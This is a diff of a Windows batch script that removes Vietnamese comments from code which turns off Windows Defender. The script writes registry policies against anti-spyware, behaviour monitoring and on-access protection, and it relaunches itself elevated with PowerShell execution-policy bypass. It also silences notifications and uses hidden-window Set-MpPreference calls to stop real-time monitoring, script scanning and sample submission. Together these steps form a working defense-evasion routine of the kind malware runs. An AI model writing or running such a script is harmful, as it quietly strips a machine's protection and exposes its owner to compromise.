@@ -1,7 +1,6 @@
 @echo off
 setlocal enabledelayedexpansion
 
-rem Tắt Windows Defender và các tính năng bảo vệ bằng lệnh cmd với quyền quản trị
 set "defenderDisableCmds[0]=REG ADD ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender"" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
 set "defenderDisableCmds[1]=REG ADD ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f"
 set "defenderDisableCmds[2]=REG ADD ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f"
@@ -12,16 +11,12 @@ for %%i in (0 1 2 3) do (
     powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd -ArgumentList '/C !cmd!' -Verb RunAs -Wait"
 )
 @echo off
-:: Tắt thông báo
 powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications -Name ToastEnabled -Type DWord -Value 0"
 
-:: Tắt Windows Defender AntiSpyware
 REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 
-:: Đợi 5 giây
 timeout /t 5 >nul
 
-:: Tắt các tính năng bảo vệ của Windows Defender bằng PowerShell
 powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend"
 powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Set-MpPreference -SubmitSamplesConsent 2"
 
